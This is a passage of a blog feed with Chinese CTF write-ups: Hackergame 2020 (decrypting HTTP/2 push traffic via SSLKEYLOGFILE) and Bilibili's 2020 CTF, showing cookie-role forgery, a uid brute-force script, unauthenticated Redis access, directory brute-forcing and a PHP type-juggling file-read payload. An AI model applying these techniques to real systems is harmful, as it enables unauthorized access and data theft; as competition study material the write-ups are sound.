证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span 